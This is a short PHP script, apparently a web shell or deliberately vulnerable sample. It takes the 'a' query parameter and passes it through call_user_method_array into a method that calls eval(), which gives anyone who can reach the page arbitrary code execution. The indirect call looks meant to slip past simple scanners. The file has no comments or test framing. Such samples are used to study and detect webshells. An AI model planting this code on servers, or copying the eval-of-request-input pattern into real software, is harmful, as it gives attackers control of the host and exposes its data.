<?php
class A {
	function test($arg) {
		eval ( $arg );
	}
}

$f = $_GET ["f"];
$a = $_GET ["a"];

call_user_method_array ( "test", new A (), $a );
?>